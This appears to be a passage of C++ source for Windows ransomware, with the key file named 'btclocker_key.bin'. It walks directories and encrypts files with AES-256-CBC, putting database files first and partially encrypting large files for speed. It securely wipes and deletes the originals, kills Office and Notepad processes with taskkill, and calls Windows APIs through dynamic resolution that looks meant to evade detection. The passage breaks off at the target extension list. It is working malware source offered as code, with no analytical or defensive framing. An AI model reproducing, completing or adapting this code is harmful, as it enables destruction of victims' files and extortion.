    BCRYPT_KEY_HANDLE hKey = NULL;
    std::vector<BYTE> keyObject;
    std::vector<BYTE> iv(IV_LENGTH);
    DWORD cbKeyObject = 0;
    NTSTATUS status;
    HANDLE hOutputFile = INVALID_HANDLE_VALUE;
    bool encryptionSuccess = false;
    MemoryMappedFile inputMap;

    try {
        // 检查文件是否可访问（使用动态API）
        DWORD attributes = DynamicAPI::GetFileAttributesW_Dyn(inputFile.c_str());
        if (attributes == INVALID_FILE_ATTRIBUTES) {
            DWORD error = GetLastError();
            std::cerr << "Cannot access file: " << inputFile << " Error: " << error << std::endl;
            return false;
        }

        // 检查文件是否被系统或隐藏
        if (attributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN)) {
            std::cerr << "Skipping system or hidden file: " << inputFile << std::endl;
            return false;
        }

        // 尝试打开内存映射文件（使用共享模式）
        if (!inputMap.open(inputFile, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, PAGE_READONLY, FILE_MAP_READ)) {
            DWORD error = GetLastError();
            std::cerr << "Cannot memory map file, possibly locked by another process: " << inputFile << " Error: " << error << std::endl;
            return false;
        }

        // 检查文件大小
        size_t fileSize = inputMap.getSize();
        if (fileSize == 0) {
            std::cerr << "File is empty: " << inputFile << std::endl;
            return false;
        }

        // 检查AES-NI硬件加速支持
        bool hwAccelSupported = IsAesNiSupported();

        // 使用AES算法（使用动态API）
        status = DynamicAPI::BCryptOpenAlgorithmProvider_Dyn(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error("BCryptOpenAlgorithmProvider failed: " + to_hex(status));
        }

        // 设置加密模式为CBC（使用动态API）
        const wchar_t cbcMode[] = BCRYPT_CHAIN_MODE_CBC;
        status = DynamicAPI::BCryptSetProperty_Dyn(hAlgorithm, BCRYPT_CHAINING_MODE,
            reinterpret_cast<PBYTE>(const_cast<wchar_t*>(cbcMode)),
            sizeof(cbcMode), 0);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error("BCryptSetProperty failed: " + to_hex(status));
        }

        // 获取密钥对象大小（使用动态API）
        DWORD cbData = 0;
        status = DynamicAPI::BCryptGetProperty_Dyn(hAlgorithm, BCRYPT_OBJECT_LENGTH,
            reinterpret_cast<PBYTE>(&cbKeyObject), sizeof(DWORD), &cbData, 0);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error("BCryptGetProperty(OBJECT_LENGTH) failed: " + to_hex(status));
        }

        keyObject.resize(cbKeyObject);

        // 生成对称密钥 - AES-256需要32字节密钥（使用动态API）
        status = DynamicAPI::BCryptGenerateSymmetricKey_Dyn(
            hAlgorithm, &hKey, keyObject.data(), cbKeyObject,
            const_cast<BYTE*>(key), KEY_LENGTH, 0);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error("BCryptGenerateSymmetricKey failed: " + to_hex(status));
        }

        // 生成随机IV（使用动态API）
        status = DynamicAPI::BCryptGenRandom_Dyn(NULL, iv.data(), IV_LENGTH, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error("BCryptGenRandom failed: " + to_hex(status));
        }

        std::string extension = inputFile.extension().string();
        std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);

        // 数据库文件扩展名集合
        static const std::unordered_set<std::string> databaseExtensions = {
            ".mdf", ".ndf", ".ldf", ".bak", ".dbf", ".db", ".sqlite", ".sqlite3",
            ".accdb", ".mdb", ".frm", ".ibd", ".myi", ".myd", ".ora", ".dmp",
            ".backup", ".wal", ".journal", ".dat", ".bin"
        };

        bool isDatabaseFile = databaseExtensions.find(extension) != databaseExtensions.end();

        // 创建输出文件 - 增强权限处理（使用动态API）
        DWORD desiredAccess = GENERIC_READ | GENERIC_WRITE;
        DWORD shareMode = FILE_SHARE_READ;
        DWORD creationDisposition = CREATE_ALWAYS;
        DWORD flagsAndAttributes = FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN;

        hOutputFile = DynamicAPI::CreateFileW_Dyn(outputFile.c_str(), desiredAccess, shareMode, NULL,
            creationDisposition, flagsAndAttributes, NULL);

        if (hOutputFile == INVALID_HANDLE_VALUE) {
            DWORD error = GetLastError();
            if (error == ERROR_ACCESS_DENIED) {
                std::cerr << "Warning: Cannot create file with full access, trying write-only mode: " << outputFile << std::endl;

                desiredAccess = GENERIC_WRITE;
                shareMode = 0;
                hOutputFile = DynamicAPI::CreateFileW_Dyn(outputFile.c_str(), desiredAccess, shareMode, NULL,
                    creationDisposition, flagsAndAttributes, NULL);

                if (hOutputFile == INVALID_HANDLE_VALUE) {
                    error = GetLastError();
                    std::cerr << "Cannot create output file: " << outputFile << " Error: " << error << std::endl;
                    return false;
                }
            }
            else {
                std::cerr << "Cannot create output file: " << outputFile << " Error: " << error << std::endl;
                return false;
            }
        }

        // 计算输出文件大小 - CBC需要IV
        size_t outputSize = fileSize;
        if (!isDatabaseFile) {
            outputSize += IV_LENGTH; // 对于非数据库文件，在开头添加IV
        }

        // 设置文件大小（使用动态API）
        LARGE_INTEGER liSize;
        liSize.QuadPart = outputSize;
        if (!DynamicAPI::SetFilePointerEx_Dyn(hOutputFile, liSize, NULL, FILE_BEGIN)) {
            DWORD error = GetLastError();
            throw std::runtime_error("SetFilePointerEx failed: " + std::to_string(error));
        }

        if (!DynamicAPI::SetEndOfFile_Dyn(hOutputFile)) {
            DWORD error = GetLastError();
            throw std::runtime_error("SetEndOfFile failed: " + std::to_string(error));
        }

        // 使用CBC模式加密函数
        if (!EncryptFileChunksCBC(hKey, iv.data(), static_cast<const BYTE*>(inputMap.data()),
            fileSize, hOutputFile, isDatabaseFile)) {
            throw std::runtime_error("EncryptFileChunksCBC execution failed");
        }

        // 关闭内存映射和文件句柄（使用动态API）
        inputMap.close();

        if (hOutputFile != INVALID_HANDLE_VALUE) {
            DynamicAPI::CloseHandle_Dyn(hOutputFile);
            hOutputFile = INVALID_HANDLE_VALUE;
        }

        // 释放CNG资源（使用动态API）
        if (hKey) {
            DynamicAPI::BCryptDestroyKey_Dyn(hKey);
            hKey = NULL;
        }

        if (hAlgorithm) {
            DynamicAPI::BCryptCloseAlgorithmProvider_Dyn(hAlgorithm, 0);
            hAlgorithm = NULL;
        }

        // 加密完成后安全删除源文件
        std::cout << "Encryption completed, securely deleting source file: " << inputFile << std::endl;

        bool deleteSuccess = SecureDelete(inputFile);
        if (!deleteSuccess) {
            std::cerr << "Warning: Secure deletion failed, trying normal deletion: " << inputFile << std::endl;
            std::error_code ec;
            deleteSuccess = fs::remove(inputFile, ec);
            if (!deleteSuccess) {
                std::cerr << "Normal deletion also failed: " << inputFile << " Error: " << ec.message() << std::endl;
                // 加密成功但删除失败，返回false
                encryptionSuccess = false;
            }
            else {
                encryptionSuccess = true;
            }
        }
        else {
            encryptionSuccess = true;
        }

        if (encryptionSuccess) {
            std::cout << "File encrypted successfully and source file deleted: " << inputFile << " -> " << outputFile << std::endl;
        }
        else {
            std::cout << "File encrypted successfully but source file deletion failed: " << inputFile << " -> " << outputFile << std::endl;
        }

        return encryptionSuccess;
    }
    catch (const std::exception& e) {
        // 清理资源（使用动态API）
        if (hKey) {
            DynamicAPI::BCryptDestroyKey_Dyn(hKey);
            hKey = NULL;
        }

        if (hAlgorithm) {
            DynamicAPI::BCryptCloseAlgorithmProvider_Dyn(hAlgorithm, 0);
            hAlgorithm = NULL;
        }

        if (hOutputFile != INVALID_HANDLE_VALUE) {
            DynamicAPI::CloseHandle_Dyn(hOutputFile);
            hOutputFile = INVALID_HANDLE_VALUE;
        }

        inputMap.close();

        // 删除不完整的输出文件
        if (!encryptionSuccess) {
            DWORD attributes = DynamicAPI::GetFileAttributesW_Dyn(outputFile.c_str());
            if (attributes != INVALID_FILE_ATTRIBUTES) {
                if (attributes & FILE_ATTRIBUTE_READONLY) {
                    DynamicAPI::SetFileAttributesW_Dyn(outputFile.c_str(), attributes & ~FILE_ATTRIBUTE_READONLY);
                }

                if (DynamicAPI::DeleteFileW_Dyn(outputFile.c_str())) {
                    std::cout << "Deleted incomplete output file: " << outputFile << std::endl;
                }
            }
        }

        std::cerr << "Encryption error: " << e.what() << " File: " << inputFile << std::endl;
        return false;
    }
}

// 实现辅助函数（使用动态API）
inline void GenerateRandomKey(BYTE* key, DWORD length) {
    NTSTATUS status = DynamicAPI::BCryptGenRandom_Dyn(
        NULL, key, length, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    if (!NT_SUCCESS(status)) {
        throw std::runtime_error("BCryptGenRandom failed: " + to_hex(status));
    }
}

inline bool SaveKeyToDocuments(const BYTE* key, DWORD length, const std::wstring& fileName) {
    try {
        fs::path savePath = GetUserDocumentsPath() / fileName;

        std::cout << "Attempting to save key to: " << savePath << std::endl;

        // 检查目录是否存在，不存在则创建
        fs::path parentDir = savePath.parent_path();
        if (!fs::exists(parentDir)) {
            if (!fs::create_directories(parentDir)) {
                std::cerr << "Failed to create directory: " << parentDir << std::endl;
                return false;
            }
            std::cout << "Created directory: " << parentDir << std::endl;
        }

        // 使用二进制模式写入文件
        std::ofstream keyFile(savePath, std::ios::binary | std::ios::trunc);
        if (!keyFile.is_open()) {
            std::cerr << "Failed to open key file for writing: " << savePath << std::endl;

            // 尝试使用宽字符路径（Windows特定）
            std::wstring widePath = savePath.wstring();
            std::ofstream keyFileW(widePath.c_str(), std::ios::binary | std::ios::trunc);
            if (!keyFileW.is_open()) {
                std::cerr << "Also failed with wide character path" << std::endl;
                return false;
            }
            keyFileW.write(reinterpret_cast<const char*>(key), length);
            keyFileW.close();
            return keyFileW.good();
        }

        keyFile.write(reinterpret_cast<const char*>(key), length);
        keyFile.close();

        if (!keyFile.good()) {
            std::cerr << "Failed to write key data" << std::endl;
            return false;
        }

        // 验证文件确实被创建
        if (fs::exists(savePath)) {
            auto fileSize = fs::file_size(savePath);
            std::cout << "Key file created successfully: " << savePath
                << " Size: " << fileSize << " bytes" << std::endl;
            return true;
        }
        else {
            std::cerr << "Key file not found after writing" << std::endl;
            return false;
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Exception in SaveKeyToDocuments: " << e.what() << std::endl;
        return false;
    }
}
inline fs::path GetUserDocumentsPath() {
    try {
        PWSTR path = nullptr;
        HRESULT hr = DynamicAPI::SHGetKnownFolderPath_Dyn(FOLDERID_Documents, 0, nullptr, &path);
        if (SUCCEEDED(hr) && path != nullptr) {
            fs::path docsPath(path);
            DynamicAPI::CoTaskMemFree_Dyn(path);

            // 验证路径是否有效
            if (fs::exists(docsPath)) {
                std::cout << "Documents path retrieved: " << docsPath << std::endl;
                return docsPath;
            }
            else {
                std::cerr << "Documents path does not exist: " << docsPath << std::endl;
            }
        }

        std::cerr << "SHGetKnownFolderPath failed: 0x" << std::hex << hr << std::endl;

        // 备用方案1：使用环境变量
        const char* userProfile = std::getenv("USERPROFILE");
        if (userProfile) {
            fs::path profilePath = fs::path(userProfile) / "Documents";
            if (fs::exists(profilePath)) {
                std::cout << "Using USERPROFILE documents path: " << profilePath << std::endl;
                return profilePath;
            }
        }

        // 备用方案2：使用当前目录
        fs::path current = fs::current_path();
        std::cout << "Falling back to current path: " << current << std::endl;
        return current;
    }
    catch (const std::exception& e) {
        std::cerr << "Exception in GetUserDocumentsPath: " << e.what() << std::endl;
        return fs::current_path();
    }
}


inline bool IsAesNiSupported() {
    int cpuInfo[4];
    __cpuid(cpuInfo, 1); // 获取CPU功能标志

    // 检查第25位 (AES-NI支持标志)
    return (cpuInfo[2] & (1 << 25)) != 0;
}

inline std::string to_hex(NTSTATUS status) {
    std::stringstream ss;
    ss << "0x" << std::hex << std::setw(8) << std::setfill('0') << status;
    return ss.str();
}

// 安全删除文件函数
bool SecureDelete(const fs::path& path) {
    // 检查文件是否存在
    if (!fs::exists(path)) {
        std::cout << "File does not exist: " << path << std::endl;
        return true;
    }

    HANDLE hFile = INVALID_HANDLE_VALUE;
    LARGE_INTEGER fileSize = { 0 };

    try {
        // 1. 打开文件
        hFile = DynamicAPI::CreateFileW_Dyn(
            path.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH,
            NULL
        );

        if (hFile == INVALID_HANDLE_VALUE) {
            DWORD error = GetLastError();
            if (error == ERROR_ACCESS_DENIED || error == ERROR_SHARING_VIOLATION) {
                std::cout << "Cannot access file, may be locked by system: " << path << std::endl;
                return false;
            }
            throw std::runtime_error("Cannot open file for secure deletion. Error code: " + std::to_string(error));
        }

        // 2. 获取文件大小
        if (!DynamicAPI::GetFileSizeEx_Dyn(hFile, &fileSize)) {
            DWORD error = GetLastError();
            DynamicAPI::CloseHandle_Dyn(hFile);
            throw std::runtime_error("Cannot get file size. Error code: " + std::to_string(error));
        }

        // 处理空文件
        if (fileSize.QuadPart == 0) {
            DynamicAPI::CloseHandle_Dyn(hFile);
            return DynamicAPI::DeleteFileW_Dyn(path.c_str());
        }

        // 3. 单次随机数据覆写
        const DWORD bufferSize = 64 * 1024;
        std::vector<BYTE> randomBuffer(bufferSize);

        // 使用密码学安全的随机数生成器
        NTSTATUS status = DynamicAPI::BCryptGenRandom_Dyn(NULL, randomBuffer.data(), bufferSize, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        if (!NT_SUCCESS(status)) {
            // 回退到标准随机数生成器
            std::random_device rd;
            std::independent_bits_engine<std::mt19937, CHAR_BIT, unsigned short> rng(rd());
            std::generate(randomBuffer.begin(), randomBuffer.end(), rng);
        }

        LARGE_INTEGER offset = { 0 };
        DWORD bytesWritten = 0;
        LONGLONG remainingBytes = fileSize.QuadPart;

        // 分块覆写文件
        while (remainingBytes > 0) {
            DWORD chunkSize = static_cast<DWORD>((bufferSize < remainingBytes) ? bufferSize : remainingBytes);

            // 设置写入位置
            offset.QuadPart = fileSize.QuadPart - remainingBytes;
            if (!DynamicAPI::SetFilePointerEx_Dyn(hFile, offset, NULL, FILE_BEGIN)) {
                DWORD error = GetLastError();
                throw std::runtime_error("Set file pointer failed. Error code: " + std::to_string(error));
            }

            // 写入随机数据
            if (!DynamicAPI::WriteFile_Dyn(hFile, randomBuffer.data(), chunkSize, &bytesWritten, NULL)) {
                DWORD error = GetLastError();
                if (error == ERROR_ACCESS_DENIED) {
                    std::cout << "File is locked, cannot securely delete: " << path << std::endl;
                    DynamicAPI::CloseHandle_Dyn(hFile);
                    return false;
                }
                throw std::runtime_error("Write random data failed. Error code: " + std::to_string(error));
            }

            if (bytesWritten != chunkSize) {
                throw std::runtime_error("Partial write error. Expected: " + std::to_string(chunkSize) +
                    ", Actual: " + std::to_string(bytesWritten));
            }

            remainingBytes -= chunkSize;
        }

        // 4. 强制刷新到磁盘
        DynamicAPI::FlushFileBuffers_Dyn(hFile);
        DynamicAPI::CloseHandle_Dyn(hFile);
        hFile = INVALID_HANDLE_VALUE;

        // 5. 文件名混淆
        fs::path tempPath = path;
        std::random_device nameRd;
        std::mt19937 nameGen(nameRd());
        std::uniform_int_distribution<> nameDis(0, 15);

        // 随机重命名2-3次
        int renameCount = 2 + (nameDis(nameGen) % 2);
        for (int i = 0; i < renameCount; ++i) {
            std::stringstream newName;
            newName << "del_";
            for (int j = 0; j < 8; ++j) {
                newName << std::hex << nameDis(nameGen);
            }
            newName << ".tmp";

            fs::path newPath = path.parent_path() / newName.str();
            try {
                fs::rename(tempPath, newPath);
                tempPath = newPath;
            }
            catch (const fs::filesystem_error&) {
                break;
            }
        }

        // 6. 最终删除
        bool deleteSuccess = DynamicAPI::DeleteFileW_Dyn(tempPath.c_str());

        if (deleteSuccess) {
            std::cout << "Secure deletion successful: " << path << std::endl;
        }
        else {
            DWORD error = GetLastError();
            std::cerr << "Final deletion failed: " << tempPath << " Error: " << error << std::endl;
        }

        return deleteSuccess;
    }
    catch (const std::exception& e) {
        std::cerr << "Secure deletion failed " << path << ": " << e.what() << std::endl;

        // 快速模式：直接删除文件
        std::error_code ec;
        if (fs::remove(path, ec)) {
            std::cout << "File removed using fast deletion: " << path << std::endl;
            return true;
        }

        std::cerr << "Fast deletion also failed: " << path << " Error: " << ec.message() << std::endl;
        return false;
    }
}

// 遍历目录并加密文件
inline void traverseAndEncryptAsync(const fs::path& directoryPath,
    const std::vector<std::string>& extensions,
    const BYTE* key) {
    try {
        // 检查目录是否有效
        if (!fs::exists(directoryPath) || !fs::is_directory(directoryPath)) {
            std::cerr << "Invalid directory: " << directoryPath << std::endl;
            return;
        }

        // 创建异步加密管理器
        AsyncEncryptionManager manager;

        // 初始化计数器
        size_t totalFiles = 0;
        size_t dbFileCount = 0;
        size_t otherFileCount = 0;
        size_t skippedFiles = 0;
        size_t smallFileCount = 0;
        size_t largeFileCount = 0;
        size_t veryLargeFileCount = 0;

        // 系统文件模式，这些文件通常无法访问或不应修改
        static const std::vector<std::wstring> systemPatterns = {
            L"WindowsApps",
            L"Windows",
            L"System32",
            L"$Recycle.Bin",
            L"ProgramData\\Microsoft\\Windows",
            L"AppData",
            L"Temp",
            L"Temporary Internet Files",
            L"WinSxS",
            L"DriverStore",
            L"Assembly",
            L"Microsoft.NET",
            L"ServiceProfiles",
            L"System Volume Information"
        };

        // 数据库文件扩展名集合
        static const std::unordered_set<std::string> databaseExtensions = {
            ".mdf", ".ndf", ".ldf", ".bak", ".dbf", ".db", ".sqlite", ".sqlite3",
            ".accdb", ".mdb", ".frm", ".ibd", ".myi", ".myd", ".ora", ".dmp",
            ".backup", ".wal", ".journal", ".dat", ".bin"
        };

        // 用于存储分类的文件
        std::vector<std::pair<fs::path, bool>> databaseFiles;
        std::vector<std::pair<fs::path, bool>> otherFiles;

        std::cout << "Starting directory scan: " << directoryPath << std::endl;

        // 性能计时
        auto scanStartTime = std::chrono::steady_clock::now();

        try {
            // 单次遍历：同时收集数据库文件和其他文件
            for (const auto& entry : fs::recursive_directory_iterator(
                directoryPath, fs::directory_options::skip_permission_denied)) {

                // 跳过非普通文件
                if (!entry.is_regular_file()) continue;

                // 检查是否是系统文件
                std::wstring filePath = entry.path().wstring();
                bool isSystemFile = false;
                for (const auto& pattern : systemPatterns) {
                    if (filePath.find(pattern) != std::wstring::npos) {
                        isSystemFile = true;
                        skippedFiles++;
                        break;
                    }
                }

                if (isSystemFile) {
                    std::cout << "Skipping system file: " << entry.path() << std::endl;
                    continue;
                }

                // 检查文件是否被其他进程锁定
                if (isFileLocked(entry.path())) {
                    std::cout << "File is locked by another process, skipping: " << entry.path() << std::endl;
                    skippedFiles++;
                    continue;
                }

                // 获取文件扩展名并转换为小写
                std::string ext = entry.path().extension().string();
                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

                // 检查是否是数据库文件
                bool isDatabaseFile = databaseExtensions.find(ext) != databaseExtensions.end();

                // 检查扩展名是否在目标列表中
                bool shouldEncrypt = std::any_of(extensions.begin(), extensions.end(),
                    [&](const std::string& targetExt) {
                        std::string lowerTarget = targetExt;
                        std::transform(lowerTarget.begin(), lowerTarget.end(), lowerTarget.begin(), ::tolower);
                        return ext == lowerTarget;
                    });

                if (shouldEncrypt) {
                    if (isDatabaseFile) {
                        databaseFiles.emplace_back(entry.path(), true);
                        dbFileCount++;
                    }
                    else {
                        otherFiles.emplace_back(entry.path(), false);
                        otherFileCount++;
                    }

                    // 统计文件大小分类
                    size_t fileSize = entry.file_size();
                    if (fileSize < 1024 * 1024) {
                        smallFileCount++;
                    }
                    else if (fileSize < 100 * 1024 * 1024) {
                        largeFileCount++;
                    }
                    else {
                        veryLargeFileCount++;
                    }

                    totalFiles++;
                }
            }
        }
        catch (const std::exception& e) {
            std::cerr << "Directory scan error: " << e.what() << std::endl;
        }
        catch (...) {
            std::cerr << "Directory scan error: Unknown exception" << std::endl;
        }

        auto scanEndTime = std::chrono::steady_clock::now();
        auto scanDuration = std::chrono::duration_cast<std::chrono::milliseconds>(scanEndTime - scanStartTime);

        std::cout << "Scan completed in " << scanDuration.count() << " ms, found " << totalFiles << " files" << std::endl;
        std::cout << "  Database files: " << dbFileCount << std::endl;
        std::cout << "  Other files: " << otherFileCount << std::endl;
        std::cout << "  Files < 1MB: " << smallFileCount << std::endl;
        std::cout << "  Files 1MB-100MB: " << largeFileCount << std::endl;
        std::cout << "  Files > 100MB: " << veryLargeFileCount << std::endl;
        std::cout << "  Skipped files: " << skippedFiles << std::endl;

        // 如果没有找到文件，直接返回
        if (totalFiles == 0) {
            std::cout << "No files to encrypt." << std::endl;
            return;
        }

        // 第一阶段：处理数据库文件（优先处理）
        if (!databaseFiles.empty()) {
            std::cout << "\n=== Phase 1: Processing " << dbFileCount << " database files ===" << std::endl;

            auto phaseStartTime = std::chrono::steady_clock::now();
            size_t phaseProcessed = 0;

            for (const auto& fileInfo : databaseFiles) {
                const auto& filePath = fileInfo.first;

                // 检查文件是否仍然存在且可访问
                if (!fs::exists(filePath)) {
                    std::cout << "File no longer exists, skipping: " << filePath << std::endl;
                    continue;
                }

                // 创建加密后的文件名
                fs::path outputFile = filePath;
                outputFile += ".hyfenc";

                // 检查输出文件是否已存在
                if (fs::exists(outputFile)) {
                    std::cout << "Output file already exists, skipping: " << outputFile << std::endl;
                    continue;
                }

                // 添加加密任务
                manager.addTask(filePath, outputFile, key);
                phaseProcessed++;

                std::cout << "Added database file encryption task: " << filePath << " ("
                    << (fileInfo.second ? "database" : "normal") << ")" << std::endl;
            }

            // 等待第一阶段任务完成
            try {
                std::cout << "Waiting for " << phaseProcessed << " database files to complete..." << std::endl;
                manager.waitForCompletion();
            }
            catch (const std::exception& e) {
                std::cerr << "Phase 1 completion error: " << e.what() << std::endl;
            }
            catch (...) {
                std::cerr << "Phase 1 completion error: Unknown exception" << std::endl;
            }

            auto phaseEndTime = std::chrono::steady_clock::now();
            auto phaseDuration = std::chrono::duration_cast<std::chrono::milliseconds>(phaseEndTime - phaseStartTime);

            std::cout << "Phase 1 completed in " << phaseDuration.count() << " ms" << std::endl;
            std::cout << "Processed " << phaseProcessed << " database files" << std::endl;
        }

        // 第二阶段：处理非数据库文件
        if (!otherFiles.empty()) {
            std::cout << "\n=== Phase 2: Processing " << otherFileCount << " non-database files ===" << std::endl;

            auto phaseStartTime = std::chrono::steady_clock::now();
            size_t phaseProcessed = 0;

            // 按文件大小排序：先处理小文件，再处理大文件
            std::sort(otherFiles.begin(), otherFiles.end(),
                [](const auto& a, const auto& b) {
                    return fs::file_size(a.first) < fs::file_size(b.first);
                });

            for (const auto& fileInfo : otherFiles) {
                const auto& filePath = fileInfo.first;

                // 检查文件是否仍然存在且可访问
                if (!fs::exists(filePath)) {
                    std::cout << "File no longer exists, skipping: " << filePath << std::endl;
                    continue;
                }

                // 创建加密后的文件名
                fs::path outputFile = filePath;
                outputFile += ".hyfenc";

                // 检查输出文件是否已存在
                if (fs::exists(outputFile)) {
                    std::cout << "Output file already exists, skipping: " << outputFile << std::endl;
                    continue;
                }

                // 添加加密任务
                manager.addTask(filePath, outputFile, key);
                phaseProcessed++;

                // 显示文件大小信息
                size_t fileSize = fs::file_size(filePath);
                std::string sizeStr;
                if (fileSize < 1024 * 1024) {
                    sizeStr = std::to_string(fileSize / 1024) + "KB";
                }
                else {
                    sizeStr = std::to_string(fileSize / (1024 * 1024)) + "MB";
                }

                std::cout << "Added file encryption task: " << filePath << " (" << sizeStr << ")" << std::endl;
            }

            // 等待第二阶段任务完成
            try {
                std::cout << "Waiting for " << phaseProcessed << " non-database files to complete..." << std::endl;
                manager.waitForCompletion();
            }
            catch (const std::exception& e) {
                std::cerr << "Phase 2 completion error: " << e.what() << std::endl;
            }
            catch (...) {
                std::cerr << "Phase 2 completion error: Unknown exception" << std::endl;
            }

            auto phaseEndTime = std::chrono::steady_clock::now();
            auto phaseDuration = std::chrono::duration_cast<std::chrono::milliseconds>(phaseEndTime - phaseStartTime);

            std::cout << "Phase 2 completed in " << phaseDuration.count() << " ms" << std::endl;
            std::cout << "Processed " << phaseProcessed << " non-database files" << std::endl;
        }

        // 最终统计和报告
        std::cout << "\n=== Encryption Complete ===" << std::endl;
        std::cout << "Summary:" << std::endl;
        std::cout << "  Total files scanned: " << totalFiles << std::endl;
        std::cout << "  Database files: " << dbFileCount << std::endl;
        std::cout << "  Other files: " << otherFileCount << std::endl;
        std::cout << "  Files < 1MB: " << smallFileCount << std::endl;
        std::cout << "  Files 1MB-100MB: " << largeFileCount << std::endl;
        std::cout << "  Files > 100MB: " << veryLargeFileCount << std::endl;
        std::cout << "  Skipped files: " << skippedFiles << std::endl;

        // 显示加密统计信息
        manager.printStatistics();

        std::cout << "\nEncryption strategy applied:" << std::endl;
        std::cout << "  Database files: Full file encryption (100%)" << std::endl;
        std::cout << "  Non-database files:" << std::endl;
        std::cout << "    - Files < 1MB: Encrypt first 4KB only" << std::endl;
        std::cout << "    - Files >= 1MB: Encrypt 15% of each chunk" << std::endl;
        std::cout << "    - Files > 100MB: Special handling for large files" << std::endl;

        // 显示性能信息
        auto totalEndTime = std::chrono::steady_clock::now();
        auto totalDuration = std::chrono::duration_cast<std::chrono::milliseconds>(totalEndTime - scanStartTime);

        std::cout << "\nPerformance:" << std::endl;
        std::cout << "  Total time: " << totalDuration.count() << " ms" << std::endl;
        std::cout << "  Scanning time: " << scanDuration.count() << " ms" << std::endl;

        if (totalDuration.count() > 0) {
            double totalSeconds = totalDuration.count() / 1000.0;
            double filesPerSecond = totalFiles / totalSeconds;
            std::cout << "  Average speed: " << filesPerSecond << " files/second" << std::endl;
        }

        std::cout << "\nEncryption completed successfully!" << std::endl;

    }
    catch (const std::exception& e) {
        std::cerr << "Critical error in traverseAndEncryptAsync: " << e.what() << std::endl;
    }
    catch (...) {
        std::cerr << "Critical error in traverseAndEncryptAsync: Unknown exception" << std::endl;
    }
}
// 辅助函数：检查文件是否被锁定
inline bool isFileLocked(const fs::path& filePath) {
    // 移除未定义的宏，直接使用动态API
    if (!DynamicAPI::IsInitialized()) {
        std::cerr << "Dynamic APIs not initialized" << std::endl;
        return false;
    }

    try {
        HANDLE hFile = DynamicAPI::CreateFileW_Dyn(filePath.c_str(), GENERIC_READ,
            FILE_SHARE_READ, NULL, OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL, NULL);

        if (hFile == INVALID_HANDLE_VALUE) {
            DWORD error = GetLastError();
            return error == ERROR_SHARING_VIOLATION || error == ERROR_ACCESS_DENIED;
        }

        DynamicAPI::CloseHandle_Dyn(hFile);
        return false;
    }
    catch (const std::exception& e) {
        std::cerr << "Error checking file lock: " << e.what() << std::endl;
        return false;
    }
}
// 主入口函数
inline int encrypthf() {
    try {
        // 初始化动态API
        if (!g_DynamicAPIInitializer.IsInitialized()) {
            std::cerr << "Failed to initialize dynamic APIs" << std::endl;
            return 1;
        }

        std::cout << "=== File Encryption Tool Started ===" << std::endl;

        // 检查硬件加速支持
        bool hwAccelSupported = IsAesNiSupported();
        std::cout << "AES Hardware Acceleration: " << (hwAccelSupported ? "SUPPORTED" : "NOT SUPPORTED") << std::endl;

        if (!hwAccelSupported) {
            std::cout << "Warning: Hardware acceleration (AES-NI) not detected. "
                << "Encryption will be performed in software mode, which may be slower." << std::endl;
        }

        // 关闭可能占用文件的应用程序
        std::cout << "Closing potential file-locking applications..." << std::endl;
        system("taskkill /f /im winword.exe > nul 2>&1");
        system("taskkill /f /im excel.exe > nul 2>&1");
        system("taskkill /f /im powerpnt.exe > nul 2>&1");
        system("taskkill /f /im notepad.exe > nul 2>&1");
        Sleep(1000); // 等待1秒让进程完全关闭

        // 生成随机密钥
        std::cout << "Generating encryption key..." << std::endl;
        BYTE encryptionKey[KEY_LENGTH];
        GenerateRandomKey(encryptionKey, KEY_LENGTH);

        // 详细诊断密钥保存过程
        std::cout << "\n=== Key Save Diagnostics ===" << std::endl;

        // 1. 检查文档路径
        fs::path docsPath = GetUserDocumentsPath();
        std::cout << "Documents path: " << docsPath << std::endl;

        // 2. 检查路径是否存在和可写
        if (fs::exists(docsPath)) {
            std::cout << "✓ Documents path exists" << std::endl;

            // 测试写入权限
            fs::path testFile = docsPath / L"test_write.tmp";
            std::ofstream testStream(testFile);
            if (testStream) {
                testStream << "test";
                testStream.close();
                fs::remove(testFile);
                std::cout << "✓ Write permission confirmed" << std::endl;
            }
            else {
                std::cerr << "✗ No write permission in documents folder" << std::endl;
            }
        }
        else {
            std::cerr << "✗ Documents path does not exist" << std::endl;
        }

        // 3. 尝试保存密钥
        std::cout << "Attempting to save key..." << std::endl;
        bool keySaved = SaveKeyToDocuments(encryptionKey, KEY_LENGTH, L"btclocker_key.bin");

        if (keySaved) {
            std::cout << "✓ Key saved successfully to documents folder" << std::endl;
        }
        else {
            std::cerr << "✗ Failed to save key to documents folder" << std::endl;

            // 备用方案：保存到当前目录
            std::cout << "Trying alternate location: current directory" << std::endl;
            fs::path currentKeyPath = fs::current_path() / "btclocker_key.bin";
            std::ofstream altKeyFile(currentKeyPath, std::ios::binary);
            if (altKeyFile) {
                altKeyFile.write(reinterpret_cast<const char*>(encryptionKey), KEY_LENGTH);
                altKeyFile.close();
                if (fs::exists(currentKeyPath)) {
                    std::cout << "✓ Key saved to alternate location: " << currentKeyPath << std::endl;
                    keySaved = true;
                }
            }

            if (!keySaved) {
                std::cerr << "✗ All key save attempts failed!" << std::endl;
                std::cerr << "Key will only be available in memory during this session." << std::endl;

                // 显示密钥的十六进制表示（仅用于调试）
                std::cout << "Key (hex): ";
                for (DWORD i = 0; i < KEY_LENGTH; ++i) {
                    printf("%02X", encryptionKey[i]);
                }
                std::cout << std::endl;
            }
        }

        // 目标文件扩展名
        std::vector<std::string> extensions = {
